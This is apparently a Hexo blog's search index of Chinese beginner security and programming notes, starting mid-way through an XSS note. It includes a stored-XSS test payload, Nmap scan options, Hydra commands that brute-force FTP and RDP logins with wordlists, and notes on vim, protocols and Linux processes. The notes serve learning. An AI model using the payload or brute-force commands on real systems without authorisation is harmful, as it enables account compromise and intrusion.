class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在评论区发送xss恶意代码，使其被存入网站数据库</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p>等受害者浏览网页，查看评论区并加载该评论时，浏览器解析到xss代码并执行脚本</p><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><p>通过javascript操作document，实现dom树的重构。</p><p>主要存在于用户能修改页面的dom，造成客户端payload在浏览器中执行</p><p>这个暂时理解不到位，正在深入学…</p><hr><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><h4 id="对输入的数据和URL参数进行过滤"><a href="#对输入的数据和URL参数进行过滤" class="headerlink" title="对输入的数据和URL参数进行过滤"></a>对输入的数据和URL参数进行过滤</h4><p>检查是否含有特殊字符 如</p><blockquote><p>&lt;   &gt;    ‘    “</p></blockquote><p>将以上字符过滤，或者编码</p><h4 id="对输出内容进行编码"><a href="#对输出内容进行编码" class="headerlink" title="对输出内容进行编码"></a>对输出内容进行编码</h4><p>变量的内容输出到HTML页面时，用编码或者转义的方式来防御攻击。</p><h4 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h4><p>将字符串js编码转换成实体html编码</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> XSS跨站脚本攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http请求报文</title>
      <link href="/2023/04/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87/"/>
      <url>/2023/04/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h2 id="http请求报文"><a href="#http请求报文" class="headerlink" title="http请求报文"></a>http请求报文</h2><h3 id="HTTP请求由四个部分组成"><a href="#HTTP请求由四个部分组成" class="headerlink" title="HTTP请求由四个部分组成"></a>HTTP请求由四个部分组成</h3><ul><li>请求行</li><li>请求头部</li><li>空行</li><li>请求数据</li></ul><p>请求行：Method request-URI HTTP-Version CRLF</p><blockquote><p>method：表示请求方法</p><p>Request-URI：统一的资源标识符</p><p>HTTP-Version：表示请求的HTTP协议版本</p><p>CRLF：表示回车和换行</p></blockquote><p>请求头部： 允许客户端传递关于自身的信息和希望的响应形式 </p><p>空行：表示请求头结束，请求正文开始</p><p>请求数据：</p><blockquote><p>get方法：提交数据时，参数会作为url的一部分发送给服务器</p><p>post方法：发送的数据在请求体中</p></blockquote><h3 id="URL-：统一资源定位符（也就是常说的网址）"><a href="#URL-：统一资源定位符（也就是常说的网址）" class="headerlink" title="URL ：统一资源定位符（也就是常说的网址）"></a>URL ：统一资源定位符（也就是常说的网址）</h3><p>一个完整的URL包含以下部分</p><blockquote><p><a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>http://  协议方案名</p><p>user:pass 登录信息（认证）</p><p><a href="http://www.example.jp/">www.example.jp</a>  服务器地址</p><p>80 端口号</p><p>/dir/index.htm  带层次的文件路径</p><p>uid=1  查询字符串</p><p>ch1  片段标识符</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> http请求报文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap和hydra常用命令</title>
      <link href="/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/nmap%E5%92%8Chydra%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/nmap%E5%92%8Chydra%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="扫描与爆破"><a href="#扫描与爆破" class="headerlink" title="扫描与爆破"></a>扫描与爆破</h3><p>Nmap<br>重要常用命令参数</p><p><code>-sP     ping扫描</code><br>例：</p><blockquote><p>nmap -sP 10.1.1.0/24  （最后的24是采用二进制表示的掩码的位数）</p></blockquote><p><code>-p     指定端口范围</code><br>例：</p><blockquote><p>nmap -p 21,23 10.1.1.1（探测目标21，23端口情况）</p></blockquote><p><code>-sV      服务版本探测</code><br>例：</p><blockquote><p>nmap -p 23,21 10.1.1.1 -sV</p></blockquote><p><code>-O     启用操作系统探测（同时可以扫描开放的端口号以及对应的服务）</code><br>例：</p><blockquote><p>nmap -O 10.1.1.1</p></blockquote><p><code>-A     全面扫描</code></p><p><code>-oN     保存txt(保存扫描报告)</code><br>例：</p><blockquote><p>nmap -O 10.1.1.1 -oN d:\baogao.txt（保存路径）</p></blockquote><h3 id="hydra-常用命令"><a href="#hydra-常用命令" class="headerlink" title="hydra 常用命令"></a>hydra 常用命令</h3><p>(转载自<a href="https://blog.csdn.net/weixin_63286108/article/details/124700517">https://blog.csdn.net/weixin_63286108/article/details/124700517</a>)</p><p>爆破FTP服务器登录密码（已知用户名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/passwd.txt ftp://192.168.31.134</span><br></pre></td></tr></table></figure><p>爆破FTP服务器的用户名和密码(1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/uname.txt -P /usr/passwd.txt ftp://192.168.31.134</span><br></pre></td></tr></table></figure><p>爆破FTP服务器的用户名和密码(2)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -C /usr/u_and_p.txt ftp://192.168.31.134</span><br></pre></td></tr></table></figure><p>爆破远程桌面服务的用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/uname.txt -P /usr/passwd.txt rdp://192.168.31.134</span><br></pre></td></tr></table></figure><p>(uname.txt、passwd.txt分别为用户名字典和密码字典)</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> Nmap和hydra常用命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim初学</title>
      <link href="/2023/04/05/%E5%B0%8F%E5%AF%84%E5%B7%A7/Vim%E5%88%9D%E5%AD%A6/"/>
      <url>/2023/04/05/%E5%B0%8F%E5%AF%84%E5%B7%A7/Vim%E5%88%9D%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="vim的三个模式"><a href="#vim的三个模式" class="headerlink" title="vim的三个模式"></a>vim的三个模式</h2><p>vim有三个模式</p><ul><li>正常模式</li><li>编辑模式</li><li>命令行模式</li></ul><p>刚打开文件处于正常模式</p><blockquote><p>编辑模式按 esc 会退出到正常模式</p></blockquote><p>要进行编辑需要进入编辑模式</p><blockquote><p>按小写 i，此时下方会提示进入了INSERT模式</p></blockquote><p>保存修改，或不做修改退出，或对文件进行搜索等  要进入命令行模式</p><blockquote><p>正常模式直接输入 : 会进入命令行模式。同样，下方也会有提示“：”</p><p>退出（quit）：输入 :q，回车。（如果对文件做出了修改，那么会出现警示</p><p>不保存退出： 输入 :q! 表示无论如何都要退出</p><p>保存退出（write  quit）： 输入 :wq（先保存，再退出，不能写为 :qw</p></blockquote><h2 id="vim的光标移动"><a href="#vim的光标移动" class="headerlink" title="vim的光标移动"></a>vim的光标移动</h2><p>在正常模式下 h j k l 四个键可以进行光标的移动</p><blockquote><p>k：向上</p><p>j：向下</p><p>h：向左</p><p>l：向右</p></blockquote><p>正常模式下，将光标移动到字符后</p><blockquote><p>按 i ：insert 在字符前面插入字符</p><p>按 a：append 在字符后面追加字符</p><p>大写i：shift+i  插到最前面</p><p>大写a： shift+a  在最后面追加</p><p>o：（open a new line ）在本行的下面新建一行</p><p>大写o： 在本行的上面新建一行</p><p>g：在最后一行下面新建一行</p><p>gg：在最初一行上面增加一行</p><p>w： （word）跳动到下一个词的开头</p><p>e：（end）跳动到单词最后</p><p>b： （back）上一个单词开头</p></blockquote><h2 id="vim的复制、粘贴、删除"><a href="#vim的复制、粘贴、删除" class="headerlink" title="vim的复制、粘贴、删除"></a>vim的复制、粘贴、删除</h2><blockquote><p>ctrl+v： 进入视觉模式（可视化块）类似于平时使用的shift+方向键，用于选中一段文字进行操作</p><p>shift+v：同样是进入视觉模式，不同的是选中一整行，如果向下选择，会把下面的行也选中</p><p>y：复制选中</p><p>yy：（yank）复制当前行</p><p>yw：（yank word）复制当前单词</p></blockquote><blockquote><p>p：（paste）粘贴</p></blockquote><blockquote><p>d: 删除选中</p><p>dd：删除当前行</p><p>dw：（delete a word）删除当前字符</p><p>cw： 替换当前单词（删除当前字符，并且进入编辑模式）</p><p>ci：（change in）删除括号内的内容</p></blockquote><blockquote><p>.  ：重复上一次操作</p><p>u：（undo）撤销上一次操作</p><p>ctrl+r： 恢复前一次操作（不小心撤回过多使用</p></blockquote><h2 id="命令行用法"><a href="#命令行用法" class="headerlink" title="命令行用法"></a>命令行用法</h2><blockquote><p>最基本的:q :q! :wq</p></blockquote><blockquote><p>:/+要搜索的字符串： 快速搜索定位</p><p>:%s/旧字符/新字符/g：（最后的g表示gobel，全局替换）把文件中的“旧字符”全部替换成“新字符”</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> vim初学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各层常用协议</title>
      <link href="/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%90%84%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%90%84%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="各层常用协议"><a href="#各层常用协议" class="headerlink" title="各层常用协议"></a>各层常用协议</h1><h2 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h2><blockquote><p>http  https  SSH  DNS  Telnet   FTP      DHCP    SMTP   POP3   RDP     SMB    MySql<br>80    443     22     53       23    20/21      67/68      25        110      3389      445      3306</p></blockquote><h2 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h2><blockquote><pre><code> ​    TCP                                 UDP 传输控制协议             用户数据报协议</code></pre></blockquote><h2 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h2><blockquote><p>ICMP<br>Internet Control Message Protocol<br>internet控制报文协议 用于在ip主机、路由器之间传递控制消息（网络是否通，主机是否可达）。</p></blockquote><blockquote><p>IP<br>Internet Protocol<br>网际互连协议：实现大规模、异构网络的互联互通。</p></blockquote><blockquote><p>ARP<br>Address Resolution Protocol<br>地址解析协议：根据IP地址获取物理地址的协议</p></blockquote><h2 id="数据链路层协议"><a href="#数据链路层协议" class="headerlink" title="数据链路层协议"></a>数据链路层协议</h2><blockquote><p>PPP<br>Point-to-Point Protocal—–ppp点到点：数据链路层封装协议中的一种，常用于广域网，使用串行链路提供远距离数据传输服务。</p></blockquote><blockquote><p>Ethernet<br>以太网：实现链路层的数据传输和地址封装（MAC，常用于局域网。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> 各层常用协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux多进程编程</title>
      <link href="/2023/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Linux%E7%BC%96%E7%A8%8B/%E7%AC%AC%E4%BA%94%E7%AB%A0%E3%80%81Linux%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
      <url>/2023/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Linux%E7%BC%96%E7%A8%8B/%E7%AC%AC%E4%BA%94%E7%AB%A0%E3%80%81Linux%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux多进程编程"><a href="#Linux多进程编程" class="headerlink" title="Linux多进程编程"></a>Linux多进程编程</h1><hr><h3 id="一、-并发概念"><a href="#一、-并发概念" class="headerlink" title="一、 并发概念"></a>一、 并发概念</h3><p>并发：</p><blockquote><p>指多个活动在同一时间段内同时进行</p></blockquote><h3 id="二、-逻辑控制流"><a href="#二、-逻辑控制流" class="headerlink" title="二、 逻辑控制流"></a>二、 逻辑控制流</h3><p>逻辑流：</p><blockquote><p>在多进程运行环境下，一个程序（或进程）按程序员意图，从main函数开始，一个一个语句，一条一条指令执行，执行轨迹为一系列程序计数器（PC）的值，给人一种每个程序都独占处理器的假象，而一般整个系统可能仅有一个CPU，各进程轮流执行，我们称进程为一个逻辑流</p></blockquote><p>实际上，每个进程的执行过程是不连续的，它们交替使用处理器</p><p>并发流：</p><blockquote><p>只要某种可能的执行模式在时间上存在重叠，它们就是并发流。</p></blockquote><p>并行流：</p><blockquote><p>如果两个流在有部分操作（或代码）同一时刻地运行在<strong>不同的</strong>处理器核或者计算机上，那么我们称它们为并行流(parallel flow)</p></blockquote><p>多任务：</p><blockquote><p>一个进程和其他进程轮流运行的概念</p></blockquote><p><strong>时间片</strong>：</p><blockquote><p>每次分配给一个进程的执行时间称之为<strong>时间片</strong>(time slice)，进程也因此划分为多个做<strong>时间分片</strong>(time slicing)</p></blockquote><h1 id="进程的基本概念"><a href="#进程的基本概念" class="headerlink" title="进程的基本概念"></a>进程的基本概念</h1><h2 id="初识进程"><a href="#初识进程" class="headerlink" title="初识进程"></a>初识进程</h2><h3 id="一、-什么是进程"><a href="#一、-什么是进程" class="headerlink" title="一、 什么是进程"></a>一、 什么是进程</h3><blockquote><p>进程是正在执行中的程序</p></blockquote><h3 id="二、-进程结构"><a href="#二、-进程结构" class="headerlink" title="二、 进程结构"></a>二、 进程结构</h3><p>进程至少包含三项内容：</p><ul><li>程序代码</li><li>数据集</li><li>进程控制块</li></ul><blockquote><p>程序代码：一般是一个包括main函数的可执行程序，程序装载到内存，进程才能启动</p></blockquote><blockquote><p>数据集：进程的处理对象，可认为是变量内容，保存从初始化、环境变量、命令行参数和文件的数据</p></blockquote><blockquote><p>PCB：保存程序代码、数据变量地址、进程其他属性，<em>PCB</em>是进程存在的唯一标志，以后操作系统就通过PCB来对进程实施管理和控制</p></blockquote><h3 id="三、进程属性（保存在PCB中"><a href="#三、进程属性（保存在PCB中" class="headerlink" title="三、进程属性（保存在PCB中"></a>三、进程属性（保存在PCB中</h3><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230404143547405.png"></p><p>进程描述信息：</p><blockquote><p>进程号（PID）</p><p>用户标识</p><p>用户组标识</p><p>进程族亲信息：父进程标识、兄弟进程标识</p></blockquote><p>控制信息：</p><blockquote><p>进程状态</p><p>调度信息：优先级、剩余时间片和调度策略</p><p>记时信息：CPU使用时间等</p><p>通信信息：未处理信号、管道、消息队列、共享内存等</p></blockquote><p>资源信息：</p><blockquote><p>存储器地址</p><p>打开文件的信息</p></blockquote><p>cpu现场信息：</p><blockquote><p>当前进程CPU寄存器副本：程序计数器PC、通用寄存器、标识寄存器FLAGS</p></blockquote><h3 id="PCB的实例（Linux任务结构体：task-struct"><a href="#PCB的实例（Linux任务结构体：task-struct" class="headerlink" title="PCB的实例（Linux任务结构体：task_struct"></a>PCB的实例（Linux任务结构体：task_struct</h3><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230404144612237.png" alt="image-20230404144612237"></p><h2 id="进程基本状态及转换"><a href="#进程基本状态及转换" class="headerlink" title="进程基本状态及转换"></a>进程基本状态及转换</h2><p>三种基本状态：</p><blockquote><ul><li>就绪</li><li>运行</li><li>阻塞</li></ul></blockquote><p>然而，在操作系统实际设计中往往增加了两种状态</p><blockquote><ul><li>创建</li><li>终止</li></ul></blockquote><p><img src="https://enderman-blog.oss-cn-guangzhou.aliyuncs.com/image-20230404145422917.png" alt="image-20230404145422917"></p><h2 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h2><p>ps命令查看进程信息</p><blockquote><p>ps -ef 显示全部进程信息</p></blockquote><blockquote><p><strong>ps</strong> -ef| grep bash 从ps命令中过滤出指定进程信息</p></blockquote><blockquote><p>ps -u  命令显示当前用户拥有进程资源消耗信息</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux编程 </category>
          
          <category> 多进程编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言常遇到的错误集</title>
      <link href="/2023/04/05/c%E8%AF%AD%E8%A8%80/%E5%B8%B8%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/"/>
      <url>/2023/04/05/c%E8%AF%AD%E8%A8%80/%E5%B8%B8%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题"><a href="#当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题" class="headerlink" title="当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题"></a>当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10</span></span><br></pre></td></tr></table></figure><p>宏定义的maxsize过小</p>]]></content>
      
      
      <categories>
          
          <category> c# </category>
          
          <category> c语言错误集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/04/03/hello-world/"/>
      <url>/2023/04/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
